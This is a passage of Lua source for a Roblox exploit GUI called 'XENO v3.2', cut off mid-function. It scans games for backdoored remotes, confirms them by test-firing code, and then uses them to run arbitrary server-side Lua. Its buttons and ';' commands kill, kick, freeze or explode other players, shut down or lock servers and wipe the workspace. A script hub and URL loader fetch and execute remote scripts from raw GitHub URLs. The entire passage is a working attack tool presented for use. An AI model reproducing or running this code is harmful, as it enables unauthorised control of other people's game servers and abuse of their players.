-- ═══════════════════════════════════════════════════
--  8 · UI COMPONENT HELPERS
-- ═══════════════════════════════════════════════════

local function card(parent, height, order)
    return U.new("Frame", {
        Size = UDim2.new(1, 0, 0, height or 90),
        BackgroundColor3 = T.Card,
        BorderSizePixel = 0,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 10)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.5}),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,10), PaddingBottom = UDim.new(0,10),
            PaddingLeft = UDim.new(0,12), PaddingRight = UDim.new(0,12),
        }),
    })
end

local function heading(parent, text, order)
    return U.new("TextLabel", {
        Size = UDim2.new(1, 0, 0, 22),
        BackgroundTransparency = 1,
        Text = text,
        TextColor3 = T.Text,
        TextSize = 15,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = order or 0,
        Parent = parent,
    })
end

local function actionBtn(parent, text, color, order, callback)
    color = color or T.Primary
    local btn = U.new("TextButton", {
        Size = UDim2.new(0, 110, 0, 30),
        BackgroundColor3 = color,
        BackgroundTransparency = 0.15,
        BorderSizePixel = 0,
        Text = text,
        TextColor3 = T.Text,
        TextSize = 12,
        Font = Enum.Font.GothamSemibold,
        AutoButtonColor = false,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 7)})})
    btn.MouseEnter:Connect(function() U.tween(btn, {BackgroundTransparency = 0}, 0.15) end)
    btn.MouseLeave:Connect(function() U.tween(btn, {BackgroundTransparency = 0.15}, 0.15) end)
    if callback then btn.MouseButton1Click:Connect(callback) end
    return btn
end

local function inputField(parent, placeholder, order)
    local box = U.new("TextBox", {
        Size = UDim2.new(1, 0, 0, 32),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
        Text = "",
        PlaceholderText = placeholder or "Type here...",
        PlaceholderColor3 = T.Sub,
        TextColor3 = T.Text,
        TextSize = 13,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        ClearTextOnFocus = false,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 7)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.4}),
        U.new("UIPadding", {PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10)}),
    })
    box.Focused:Connect(function()
        local s = box:FindFirstChildWhichIsA("UIStroke")
        if s then U.tween(s, {Color = T.Primary, Transparency = 0}, 0.2) end
    end)
    box.FocusLost:Connect(function()
        local s = box:FindFirstChildWhichIsA("UIStroke")
        if s then U.tween(s, {Color = T.Border, Transparency = 0.4}, 0.2) end
    end)
    return box
end

-- ═══════════════════════════════════════════════════
--  9 · DASHBOARD PAGE
-- ═══════════════════════════════════════════════════

local playerCountLbl, backdoorCountLbl, statusValLbl, scanResultsLabel

do
    local pg = pages.Dashboard
    heading(pg, "Dashboard", 1)

    local infoRow = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 60),
        BackgroundTransparency = 1,
        LayoutOrder = 2,
        Parent = pg,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
        }),
    })

    local function infoCard(label, initial, col, order)
        local c = U.new("Frame", {
            Size = UDim2.new(0.32, -4, 1, 0),
            BackgroundColor3 = T.Card,
            BorderSizePixel = 0,
            LayoutOrder = order,
            Parent = infoRow,
        }, {
            U.new("UICorner", {CornerRadius = UDim.new(0, 8)}),
            U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.6}),
        })
        U.new("TextLabel", {
            Size = UDim2.new(1, -16, 0, 16),
            Position = UDim2.new(0, 8, 0, 8),
            BackgroundTransparency = 1,
            Text = label,
            TextColor3 = T.Sub,
            TextSize = 10,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = c,
        })
        local vl = U.new("TextLabel", {
            Name = "Value",
            Size = UDim2.new(1, -16, 0, 22),
            Position = UDim2.new(0, 8, 0, 28),
            BackgroundTransparency = 1,
            Text = initial,
            TextColor3 = col or T.Text,
            TextSize = 17,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = c,
        })
        return vl
    end

    playerCountLbl   = infoCard("PLAYERS ONLINE", tostring(#Players:GetPlayers()), T.Accent, 1)
    backdoorCountLbl = infoCard("CONFIRMED BACKDOORS", "—", T.Warn, 2)
    statusValLbl     = infoCard("STATUS", "Ready", T.Sub, 3)

    Players.PlayerAdded:Connect(function()
        playerCountLbl.Text = tostring(#Players:GetPlayers())
    end)
    Players.PlayerRemoving:Connect(function()
        task.wait(0.1)
        playerCountLbl.Text = tostring(#Players:GetPlayers())
    end)

    heading(pg, "Backdoor Scanner", 3)

    local scanCard = card(pg, 160, 4)

    scanResultsLabel = U.new("TextLabel", {
        Name = "ScanResults",
        Size = UDim2.new(1, 0, 0, 90),
        BackgroundTransparency = 1,
        Text = '<font color="#9399B2">Press Scan to validate remotes against '
            .. tostring(#BD.patterns) .. ' fire patterns\n'
            .. 'and ' .. tostring(#BD.exactNames) .. ' known backdoor signatures.</font>',
        TextColor3 = T.Sub,
        TextSize = 12,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = scanCard,
    })

    local scanBtnsRow = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = scanCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
        }),
    })

    local scanRunning = false

    local function runScan()
        if scanRunning then return end
        scanRunning = true

        BD:resetScanned()
        setStatus("Scanning...", T.Warn)
        statusValLbl.Text = "Scanning..."
        statusValLbl.TextColor3 = T.Warn
        backdoorCountLbl.Text = "..."
        scanResultsLabel.Text = '<font color="#F9E2AF">Gathering remotes from all services...</font>'

        task.spawn(function()
            local confirmed = BD:scan(function(phase, total, current, name, extra)
                if phase == "gathering" then
                    scanResultsLabel.Text = '<font color="#F9E2AF">Scanning 12+ services for remotes...</font>'

                elseif phase == "gathered" then
                    local info = extra
                    scanResultsLabel.Text = string.format(
                        '<font color="#F9E2AF">Found %d remotes to validate</font>\n'
                        .. '<font color="#A6E3A1">▸ %d exact signature matches (priority 1)</font>\n'
                        .. '<font color="#F9E2AF">▸ %d pattern name matches (priority 2)</font>\n'
                        .. '<font color="#9399B2">▸ %d short-name · %d other (priority 3-4)</font>\n'
                        .. '<font color="#9399B2">Testing %d fire patterns per remote...</font>',
                        total,
                        info.exact, info.pattern, info.short, info.other,
                        #BD.patterns
                    )
                    task.wait(1.5)

                elseif phase == "validating" then
                    scanResultsLabel.Text = string.format(
                        '<font color="#F9E2AF">Validating %d/%d</font>'
                        .. ' <font color="#CDD6F4">— %s</font>\n'
                        .. '<font color="#9399B2">Fire → Wait → Check marker for each pattern</font>\n'
                        .. '<font color="#A6E3A1">Confirmed so far: %d</font>',
                        current, total, tostring(name), #BD.confirmed
                    )
                    setStatus(current .. "/" .. total .. " — " .. tostring(name), T.Warn)

                elseif phase == "found" then
                    local entry = extra
                    Notify("✓ " .. entry.name .. " [" .. entry.fingerprint .. "]", T.OK, 5)

                elseif phase == "done" then
                    -- handled below
                end
            end)

            backdoorCountLbl.Text = tostring(#confirmed)

            if #confirmed == 0 then
                local totalRemotes = #BD:gatherRemotes()
                scanResultsLabel.Text =
                    '<font color="#F3788C">No validated backdoors found.</font>\n\n'
                    .. '<font color="#9399B2">Scanned ' .. tostring(totalRemotes) .. ' remotes across 12+ services\n'
                    .. 'using ' .. tostring(#BD.patterns) .. ' fire patterns each.\n\n'
                    .. 'No remote accepted and executed server-side code.</font>\n\n'
                    .. '<font color="#9399B2">Try:\n'
                    .. '▸ A different server\n'
                    .. '▸ Require a backdoor module via Scripts tab\n'
                    .. '▸ A known backdoored game (obbies, tycoons, etc)</font>'
                setStatus("No backdoors found", T.Err)
                statusValLbl.Text = "Clean"
                statusValLbl.TextColor3 = T.Err
                Notify("Scan complete — 0 backdoors", T.Err)
            else
                local lines = {}
                for i, entry in ipairs(confirmed) do
                    lines[#lines+1] = string.format(
                        '<font color="#A6E3A1">✓ %s</font>', entry.name
                    )
                    lines[#lines+1] = string.format(
                        '<font color="#9399B2">  %s · %s</font>', entry.type, entry.fingerprint
                    )
                    lines[#lines+1] = string.format(
                        '<font color="#9399B2">  Pattern: %s</font>', entry.patternName
                    )
                    if i >= 3 and #confirmed > 3 then
                        lines[#lines+1] = string.format(
                            '<font color="#9399B2">  ...and %d more</font>', #confirmed - 3
                        )
                        break
                    end
                end
                scanResultsLabel.Text = table.concat(lines, "\n")

                BD:connect(confirmed[1])
                setStatus(confirmed[1].name .. " [" .. confirmed[1].fingerprint .. "]", T.OK)
                statusValLbl.Text = "Connected"
                statusValLbl.TextColor3 = T.OK
                Notify("✓ Connected: " .. confirmed[1].name
                    .. " via \"" .. confirmed[1].patternName .. "\""
                    .. " [" .. confirmed[1].fingerprint .. "]", T.OK, 6)
            end

            scanRunning = false
        end)
    end

    actionBtn(scanBtnsRow, "🔍 Scan", T.Primary, 1, runScan)

    actionBtn(scanBtnsRow, "⚡ Connect #1", T.OK, 2, function()
        if #BD.confirmed == 0 then
            Notify("No confirmed backdoors — run a scan first", T.Err)
            return
        end
        BD:connect(BD.confirmed[1])
        setStatus(BD.confirmed[1].name .. " [" .. BD.confirmed[1].fingerprint .. "]", T.OK)
        statusValLbl.Text = "Connected"
        statusValLbl.TextColor3 = T.OK
        Notify("✓ Connected: " .. BD.confirmed[1].name, T.OK)
    end)

    actionBtn(scanBtnsRow, "⛔ Disconnect", T.Err, 3, function()
        BD:disconnect()
        setStatus("Disconnected", T.Err)
        statusValLbl.Text = "Disconnected"
        statusValLbl.TextColor3 = T.Err
        Notify("Disconnected from backdoor", T.Warn)
    end)

    -- Manual connect section
    heading(pg, "Manual Connect", 5)
    local manualCard = card(pg, 80, 6)

    U.new("TextLabel", {
        Size = UDim2.new(1, 0, 0, 16),
        BackgroundTransparency = 1,
        Text = "Paste a remote's full path if you know it:",
        TextColor3 = T.Sub,
        TextSize = 11,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = manualCard,
    })

    local manualInput = inputField(manualCard, "e.g. ReplicatedStorage.RemoteEvent", 2)
    manualInput.Size = UDim2.new(0.72, 0, 0, 30)
    manualInput.Position = UDim2.new(0, 0, 1, -32)

    local manualBtn = actionBtn(manualCard, "Validate", T.Accent, 3, function()
        local path = manualInput.Text
        if path == "" then Notify("Enter a path", T.Err); return end

        local obj = nil
        pcall(function()
            obj = game
            for part in path:gmatch("[^%.]+") do
                if part ~= "game" then
                    obj = obj:FindFirstChild(part)
                end
            end
        end)

        if not obj or (not obj:IsA("RemoteEvent") and not obj:IsA("RemoteFunction")) then
            Notify("Could not find remote at that path", T.Err)
            return
        end

        Notify("Validating " .. obj.Name .. "...", T.Warn)
        setStatus("Validating...", T.Warn)

        task.spawn(function()
            local valid, patIdx, patName = BD:validate(obj)
            if valid then
                local fpName = BD:fingerprint(obj, patName)
                local entry = {
                    inst        = obj,
                    name        = obj.Name,
                    path        = obj:GetFullName(),
                    type        = obj.ClassName,
                    patternIdx  = patIdx,
                    patternName = patName,
                    fingerprint = fpName,
                }
                BD:connect(entry)
                BD.confirmed[#BD.confirmed+1] = entry
                backdoorCountLbl.Text = tostring(#BD.confirmed)
                setStatus(obj.Name .. " [" .. fpName .. "]", T.OK)
                statusValLbl.Text = "Connected"
                statusValLbl.TextColor3 = T.OK
                Notify("✓ Validated: " .. obj.Name .. " via \"" .. patName .. "\" [" .. fpName .. "]", T.OK)
            else
                setStatus("Validation failed", T.Err)
                Notify("✗ Not a backdoor — no pattern produced server execution", T.Err)
            end
        end)
    end)
    manualBtn.Position = UDim2.new(0.74, 4, 1, -32)
end

-- ═══════════════════════════════════════════════════
--  10 · PLAYERS PAGE
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Players
    heading(pg, "Player Management", 1)

    local targetInput = inputField(pg, "Player name (or me / all / others)...", 2)

    heading(pg, "Quick Actions", 3)

    local actionsGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 220),
        BackgroundTransparency = 1,
        LayoutOrder = 4,
        Parent = pg,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 120, 0, 32),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        }),
    })

    local playerActions = {
        {"💀 Kill",        "kill",      T.Err},
        {"🚪 Kick",        "kick",      T.Err},
        {"🛡️ God",         "god",       T.OK},
        {"❄️ Freeze",      "freeze",    T.Accent},
        {"🔥 Thaw",        "thaw",      T.Warn},
        {"👻 Invis",       "invisible", T.Sub},
        {"👁️ Visible",     "visible",   T.Text},
        {"💥 Explode",     "explode",   T.Err},
        {"🔥 Fire",        "fire",      T.Warn},
        {"✨ Sparkles",    "sparkles",  T.Accent},
        {"🪑 Sit",         "sit",       T.Sub},
        {"⬆️ Jump",        "jump",      T.OK},
        {"🏃 Speed 100",   "speed",     T.Primary},
        {"🦘 JumpPwr 100", "jpower",    T.Primary},
        {"🛡️ FF",          "ff",        T.OK},
        {"🚫 UnFF",        "unff",      T.Err},
    }

    for i, act in ipairs(playerActions) do
        actionBtn(actionsGrid, act[1], act[3], i, function()
            if not BD:isConnected() then
                Notify("No backdoor connected!", T.Err)
                return
            end
            local query = targetInput.Text ~= "" and targetInput.Text or "me"
            local targets = U.findPlayers(query)
            if #targets == 0 then
                Notify("No player found: " .. query, T.Err)
                return
            end
            for _, plr in ipairs(targets) do
                local cmd  = act[2]
                local pn   = string.format('game.Players["%s"]', plr.Name)
                local char = pn .. ".Character"
                local hrp  = char .. ":FindFirstChild('HumanoidRootPart')"
                local hum  = char .. ":FindFirstChildWhichIsA('Humanoid')"
                local code = ""

                if cmd == "kill" then
                    code = "pcall(function() " .. char .. ":BreakJoints() end)"
                elseif cmd == "kick" then
                    code = pn .. ':Kick("Removed by XENO")'
                elseif cmd == "god" then
                    code = "pcall(function() local h = " .. hum .. "; h.MaxHealth = math.huge; h.Health = math.huge end)"
                elseif cmd == "freeze" then
                    code = "pcall(function() " .. hrp .. ".Anchored = true end)"
                elseif cmd == "thaw" then
                    code = "pcall(function() " .. hrp .. ".Anchored = false end)"
                elseif cmd == "invisible" then
                    code = "pcall(function() for _,v in pairs(" .. char .. ":GetDescendants()) do "
                        .. "if v:IsA('BasePart') then v.Transparency = 1 end "
                        .. "if v:IsA('Decal') then v.Transparency = 1 end end end)"
                elseif cmd == "visible" then
                    code = "pcall(function() for _,v in pairs(" .. char .. ":GetDescendants()) do "
                        .. "if v:IsA('BasePart') and v.Name ~= 'HumanoidRootPart' then v.Transparency = 0 end "
                        .. "if v:IsA('Decal') then v.Transparency = 0 end end end)"
                elseif cmd == "explode" then
                    code = "pcall(function() local e = Instance.new('Explosion', workspace); e.Position = " .. hrp .. ".Position end)"
                elseif cmd == "fire" then
                    code = "pcall(function() Instance.new('Fire', " .. hrp .. ") end)"
                elseif cmd == "sparkles" then
                    code = "pcall(function() Instance.new('Sparkles', " .. hrp .. ") end)"
                elseif cmd == "sit" then
                    code = "pcall(function() " .. hum .. ".Sit = true end)"
                elseif cmd == "jump" then
                    code = "pcall(function() " .. hum .. ".Jump = true end)"
                elseif cmd == "speed" then
                    code = "pcall(function() " .. hum .. ".WalkSpeed = 100 end)"
                elseif cmd == "jpower" then
                    code = "pcall(function() local h = " .. hum .. "; h.UseJumpPower = true; h.JumpPower = 100 end)"
                elseif cmd == "ff" then
                    code = "pcall(function() Instance.new('ForceField', " .. char .. ") end)"
                elseif cmd == "unff" then
                    code = "pcall(function() for _,v in pairs(" .. char .. ":GetChildren()) do "
                        .. "if v:IsA('ForceField') then v:Destroy() end end end)"
                end

                local ok, err = BD:exec(code)
                if ok then
                    Notify(act[1] .. " → " .. plr.Name, T.OK)
                else
                    Notify("Error: " .. tostring(err), T.Err)
                end
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  11 · COMMANDS PAGE
-- ═══════════════════════════════════════════════════

local cmdHistory = {}
local addHistory
local cmdInput

do
    local pg = pages.Commands
    heading(pg, "Command Console", 1)

    cmdInput = inputField(pg, CFG.Prefix .. "command [args...]", 2)

    local historyCard = card(pg, 230, 3)
    local historyLabel = U.new("TextLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = '<font color="#9399B2">Command history will appear here...</font>',
        TextColor3 = T.Sub,
        TextSize = 12,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = historyCard,
    })

    addHistory = function(entry, color)
        table.insert(cmdHistory, 1, {text = entry, color = color or "#CDD6F4"})
        if #cmdHistory > CFG.MaxHistory then table.remove(cmdHistory) end
        local lines = {}
        for i = 1, math.min(#cmdHistory, 24) do
            local h = cmdHistory[i]
            lines[#lines+1] = string.format('<font color="%s">%s</font>', h.color, h.text)
        end
        historyLabel.Text = table.concat(lines, "\n")
    end

    heading(pg, "Reference", 4)
    local refCard = card(pg, 180, 5)
    U.new("TextLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = table.concat({
            '<font color="#8A2BE2">Player Commands:</font>',
            ';kill <plr> · ;kick <plr> [reason] · ;god <plr>',
            ';freeze <plr> · ;thaw <plr> · ;tp <plr> <plr2>',
            ';speed <plr> <n> · ;jp <plr> <n>',
            ';ff <plr> · ;unff <plr> · ;explode <plr> · ;sit <plr>',
            ';invisible <plr> · ;visible <plr>',
            ';fire <plr> · ;sparkles <plr> · ;smoke <plr>',
            '',
            '<font color="#8A2BE2">Server Commands:</font>',
            ';time <n> · ;fog <n> · ;gravity <n> · ;music <id>',
            ';stopmusic · ;message <text> · ;hint <text>',
            ';shutdown · ;lock · ;unlock',
            '',
            '<font color="#8A2BE2">Utility:</font>',
            ';require <id> · ;loadurl <url> · ;exec <code>',
            ';cmds · ;clear · ;status',
            'Targets: me / all / others / partial name',
        }, "\n"),
        TextColor3 = T.Sub,
        TextSize = 11,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = refCard,
    })
end

-- ═══════════════════════════════════════════════════
--  12 · SCRIPTS PAGE
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Scripts
    heading(pg, "Require Script Loader", 1)

    local requireCard = card(pg, 80, 2)
    local reqInput = inputField(requireCard, "Enter Module Asset ID...", 1)
    reqInput.Size = UDim2.new(1, 0, 0, 30)

    local reqBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = requireCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        }),
    })

    actionBtn(reqBtns, "⚡ Require", T.Primary, 1, function()
        local id = tonumber(reqInput.Text)
        if not id then Notify("Invalid module ID", T.Err); return end
        if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:requireModule(id)
        if ok then Notify("Required module: " .. id, T.OK)
        else Notify("Require failed: " .. tostring(err), T.Err) end
    end)

    heading(pg, "URL Loader", 3)
    local urlCard = card(pg, 80, 4)
    local urlInput = inputField(urlCard, "Paste raw script URL...", 1)
    urlInput.Size = UDim2.new(1, 0, 0, 30)

    local urlBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = urlCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        }),
    })

    actionBtn(urlBtns, "🌐 Load URL", T.Accent, 1, function()
        local url = urlInput.Text
        if url == "" then Notify("Enter a URL first", T.Err); return end
        if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:loadUrl(url)
        if ok then Notify("Loaded script from URL", T.OK)
        else Notify("URL load failed: " .. tostring(err), T.Err) end
    end)

    heading(pg, "Server-Side Code Executor", 5)
    local execCard = card(pg, 145, 6)
    local execBox = U.new("TextBox", {
        Size = UDim2.new(1, 0, 0, 88),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
        Text = "",
        PlaceholderText = "-- Write server-side Lua code here...",
        PlaceholderColor3 = T.Sub,
        TextColor3 = T.OK,
        TextSize = 12,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        MultiLine = true,
        ClearTextOnFocus = false,
        TextWrapped = true,
        Parent = execCard,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 7)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.4}),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,8), PaddingBottom = UDim.new(0,8),
            PaddingLeft = UDim.new(0,10), PaddingRight = UDim.new(0,10),
        }),
    })

    local execBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = execCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
        }),
    })

    actionBtn(execBtns, "▶ Execute SS", T.OK, 1, function()
        if execBox.Text == "" then Notify("Write some code first", T.Warn); return end
        if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
        local ok, err = BD:exec(execBox.Text)
        if ok then Notify("Code executed server-side", T.OK)
        else Notify("Execution error: " .. tostring(err), T.Err) end
    end)

    actionBtn(execBtns, "🗑️ Clear", T.Sub, 2, function()
        execBox.Text = ""
    end)

    heading(pg, "Script Hub", 7)

    local hubEntries = {
        {name = "Infinite Yield",  desc = "Universal admin commands",  url = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
        {name = "Dex Explorer",    desc = "Game object explorer",      url = "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
        {name = "Remote Spy",      desc = "Monitor remote traffic",    url = "https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"},
    }

    for idx, entry in ipairs(hubEntries) do
        local hubCard = card(pg, 55, 7 + idx)
        U.new("TextLabel", {
            Size = UDim2.new(0.6, 0, 0, 16),
            BackgroundTransparency = 1,
            Text = "📜 " .. entry.name,
            TextColor3 = T.Text,
            TextSize = 13,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = hubCard,
        })
        U.new("TextLabel", {
            Size = UDim2.new(0.6, 0, 0, 14),
            Position = UDim2.new(0, 0, 0, 18),
            BackgroundTransparency = 1,
            Text = entry.desc,
            TextColor3 = T.Sub,
            TextSize = 11,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = hubCard,
        })
        local hBtn = actionBtn(hubCard, "Execute", T.Primary, 1, function()
            if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
            local ok, err = BD:loadUrl(entry.url)
            if ok then Notify("Loaded: " .. entry.name, T.OK)
            else Notify("Failed: " .. tostring(err), T.Err) end
        end)
        hBtn.Position = UDim2.new(1, -110, 0.5, -15)
    end
end

-- ═══════════════════════════════════════════════════
--  13 · SERVER PAGE
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Server
    heading(pg, "Server Controls", 1)

    local lightCard = card(pg, 110, 2)
    U.new("TextLabel", {
        Size = UDim2.new(1, 0, 0, 16),
        BackgroundTransparency = 1,
        Text = "🌤️ Lighting & Atmosphere",
        TextColor3 = T.Text,
        TextSize = 13,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = lightCard,
    })

    local lightGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 70),
        Position = UDim2.new(0, 0, 0, 22),
        BackgroundTransparency = 1,
        Parent = lightCard,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 110, 0, 30),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        }),
    })

    local serverActions = {
        {"☀️ Day",     'game.Lighting.ClockTime = 14',              T.Warn},
        {"🌙 Night",   'game.Lighting.ClockTime = 0',               T.Accent},
        {"🌫️ Fog On",  'game.Lighting.FogEnd = 80',                T.Sub},
        {"🌫️ Fog Off", 'game.Lighting.FogEnd = 100000',            T.Text},
        {"🔆 Bright",  'game.Lighting.Brightness = 3; game.Lighting.Ambient = Color3.new(1,1,1)', T.Warn},
        {"🌑 Dark",    'game.Lighting.Brightness = 0; game.Lighting.Ambient = Color3.new(0,0,0)', T.Sub},
    }

    for i, sa in ipairs(serverActions) do
        actionBtn(lightGrid, sa[1], sa[3], i, function()
            if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
            local ok = BD:exec(sa[2])
            if ok then Notify(sa[1] .. " applied", T.OK) end
        end)
    end

    heading(pg, "Physics & World", 3)
    local physCard = card(pg, 80, 4)
    local gravInput = inputField(physCard, "Gravity (default: 196.2)...", 1)
    gravInput.Size = UDim2.new(0.65, 0, 0, 30)

    local gravBtn = actionBtn(physCard, "Set Gravity", T.Primary, 2, function()
        local val = tonumber(gravInput.Text) or 196.2
        if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
        BD:exec("workspace.Gravity = " .. val)
        Notify("Gravity → " .. val, T.OK)
    end)
    gravBtn.Position = UDim2.new(0.68, 0, 0, 0)

    heading(pg, "Server Actions", 5)
    local miscGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 80),
        BackgroundTransparency = 1,
        LayoutOrder = 6,
        Parent = pg,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 130, 0, 32),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        }),
    })

    local miscActions = {
        {"🔒 Lock Server", function()
            BD:exec('game.Players.MaxPlayers = #game.Players:GetPlayers()')
            Notify("Server locked", T.OK)
        end, T.Warn},
        {"🔓 Unlock Server", function()
            BD:exec('game.Players.MaxPlayers = 50')
            Notify("Server unlocked", T.OK)
        end, T.OK},
        {"💣 Shutdown", function()
            BD:exec('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("Server shutdown — XENO") end')
            Notify("Shutdown initiated", T.Err)
        end, T.Err},
        {"💬 Message", function()
            BD:exec('local m = Instance.new("Message", workspace); m.Text = "XENO v3.2"; game:GetService("Debris"):AddItem(m, 5)')
            Notify("Server message sent", T.OK)
        end, T.Accent},
        {"🎵 Stop Music", function()
            BD:exec('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop() v:Destroy() end end')
            Notify("All sounds stopped", T.OK)
        end, T.Sub},
        {"🧹 Clean WS", function()
            BD:exec('for _,v in pairs(workspace:GetChildren()) do if not v:IsA("Terrain") and not v:IsA("Camera") and not game.Players:GetPlayerFromCharacter(v) then pcall(function() v:Destroy() end) end end')
            Notify("Workspace cleaned", T.OK)
        end, T.Err},
    }

    for i, ma in ipairs(miscActions) do
        actionBtn(miscGrid, ma[1], ma[3], i, function()
            if not BD:isConnected() then Notify("No backdoor connected!", T.Err); return end
            ma[2]()
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  14 · COMMAND REGISTRY & PARSER
-- ═══════════════════════════════════════════════════

local Commands = {}

local function reg(name, aliases, usage, fn)
    local entry = {name = name, aliases = aliases or {}, usage = usage or "", fn = fn}
    Commands[name:lower()] = entry
    for _, a in ipairs(aliases) do
        Commands[a:lower()] = entry
    end
end

local function ssRun(code)
    if not BD:isConnected() then
        Notify("No backdoor connected!", T.Err)
        addHistory("✗ Not connected", "#F3788C")
        return false
    end
    local ok, err = BD:exec(code)
    if not ok then
        addHistory("✗ " .. tostring(err), "#F3788C")
    end
    return ok
end

local function pRef(name)
    return string.format('game.Players["%s"]', name)
end

-- Player commands ──────────────────────────────────

reg("kill", {"slay"}, ";kill <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() " .. pRef(p.Name) .. ".Character:BreakJoints() end)")
        addHistory("→ kill " .. p.Name, "#F3788C")
    end
end)

reg("kick", {"boot"}, ";kick <plr> [reason]", function(args)
    local reason = table.concat(args, " ", 2)
    if reason == "" then reason = "Kicked by XENO" end
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun(pRef(p.Name) .. ':Kick("' .. reason .. '")')
        addHistory("→ kick " .. p.Name, "#F3788C")
    end
end)

reg("god", {"godmode"}, ";god <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        local h = pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid")'
        ssRun("pcall(function() " .. h .. ".MaxHealth = math.huge; " .. h .. ".Health = math.huge end)")
        addHistory("→ god " .. p.Name, "#A6E3A1")
    end
end)

reg("speed", {"ws"}, ";speed <plr> <n>", function(args)
    local val = tonumber(args[2]) or 100
    for _, p in ipairs(U.findPlayers(args[1])) do
